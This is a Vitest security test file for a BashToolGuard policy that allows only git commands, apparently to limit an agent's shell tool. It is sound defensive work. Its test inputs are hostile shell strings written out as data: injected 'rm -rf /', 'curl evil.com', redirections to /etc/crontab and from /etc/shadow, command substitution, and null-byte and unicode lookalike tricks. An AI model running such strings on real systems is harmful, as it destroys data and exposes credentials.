import { describe, expect, it } from 'vitest'
import { command } from '~/command'
import { greedy } from '~/extractables/greedy'
import { BashToolGuard } from './bash'



describe('BashToolGuard — security', () => {

  const policy = BashToolGuard({ allow: [command`git ${greedy}`] })

  describe('newline injection (SEC-C1)', () => {

    it('denies newline-injected command', () => {

      expect(policy({ command: 'git status\nrm -rf /' }).allowed).toBe(false)
    })

    it('allows trailing newline (no second command)', () => {

      expect(policy({ command: 'git status\n' }).allowed).toBe(true)
    })

    it('denies multiple newline-separated commands', () => {

      expect(policy({ command: 'git log\ncurl evil.com\nwhoami' }).allowed).toBe(false)
    })
  })

  describe('redirection injection (SEC-C2)', () => {

    it('denies output redirection >', () => {

      expect(policy({ command: 'git log > /etc/crontab' }).allowed).toBe(false)
    })

    it('denies append redirection >>', () => {

      expect(policy({ command: 'git log >> /tmp/stolen' }).allowed).toBe(false)
    })

    it('denies input redirection <', () => {

      expect(policy({ command: 'git hash-object < /etc/shadow' }).allowed).toBe(false)
    })
  })

  describe('background operator injection (SEC-C3)', () => {

    it('denies background operator &', () => {

      expect(policy({ command: 'git status & curl evil.com' }).allowed).toBe(false)
    })

    it('still handles && correctly (both parts checked)', () => {

      expect(policy({ command: 'git status && git log' }).allowed).toBe(true)
    })

    it('denies && when second part is not allowed', () => {

      expect(policy({ command: 'git status && curl evil.com' }).allowed).toBe(false)
    })
  })

  describe('empty command (SEC-C4)', () => {

    it('denies empty string', () => {

      expect(policy({ command: '' }).allowed).toBe(false)
    })

    it('denies whitespace-only', () => {

      expect(policy({ command: '   ' }).allowed).toBe(false)
    })

    it('denies undefined command', () => {

      expect(policy({ command: undefined }).allowed).toBe(false)
    })
  })

  describe('heredoc injection (SEC-C5)', () => {

    it('denies heredoc operator <<', () => {

      expect(policy({ command: 'git hash-object << EOF' }).allowed).toBe(false)
    })

    it('denies herestring <<<', () => {

      expect(policy({ command: 'git hash-object <<< payload' }).allowed).toBe(false)
    })
  })

  describe('subshell injection (SEC-C6)', () => {

    it('denies subshell with parentheses', () => {

      expect(policy({ command: 'git status (rm -rf /)' }).allowed).toBe(false)
    })

    it('denies command substitution $()', () => {

      expect(policy({ command: 'git checkout $(whoami)' }).allowed).toBe(false)
    })
  })

  describe('variable expansion (SEC-H1)', () => {

    it('denies $HOME bare variable', () => {

      expect(policy({ command: 'git clone $HOME/repo' }).allowed).toBe(false)
    })

    it('denies $PATH', () => {

      expect(policy({ command: 'git status $PATH' }).allowed).toBe(false)
    })
  })

  describe('quote-aware greedy', () => {

    it('allows > inside double quotes', () => {

      expect(policy({ command: 'git commit -m "fix > issue"' }).allowed).toBe(true)
    })

    it('allows > inside single quotes', () => {

      expect(policy({ command: `git commit -m 'fix > issue'` }).allowed).toBe(true)
    })

    it('denies $ inside double quotes', () => {

      expect(policy({ command: 'git commit -m "$HOME"' }).allowed).toBe(false)
    })

    it('allows $ inside single quotes', () => {

      expect(policy({ command: `git commit -m '$HOME'` }).allowed).toBe(true)
    })

    it('denies unclosed quote', () => {

      expect(policy({ command: 'git commit -m "unclosed' }).allowed).toBe(false)
    })

    it('allows escaped quotes inside double quotes', () => {

      expect(policy({ command: 'git commit -m "hello \\"world\\""' }).allowed).toBe(true)
    })
  })

  describe('combined attacks', () => {

    it('denies comment + newline injection', () => {

      expect(policy({ command: 'git status # comment\nrm -rf /' }).allowed).toBe(false)
    })

    it('denies pipe + background', () => {

      expect(policy({ command: 'git log | tee /tmp/out & curl evil.com' }).allowed).toBe(false)
    })
  })

  describe('unicode and null bytes (TEST-H10)', () => {

    it('rejects null byte in command', () => {

      expect(policy({ command: 'git status\0rm -rf /' }).allowed).toBe(false)
    })

    it('rejects unicode in command', () => {

      expect(policy({ command: 'git status \u2014version' }).allowed).toBe(false)
    })

    it('rejects null byte in argument', () => {

      const branchPolicy = BashToolGuard({ allow: [command`git checkout ${greedy}`] })

      expect(branchPolicy({ command: 'git checkout main\0--dangerous' }).allowed).toBe(false)
    })

    it('rejects unicode flag lookalike', () => {

      expect(policy({ command: 'git log \u2212\u2212all' }).allowed).toBe(false)
    })
  })
})
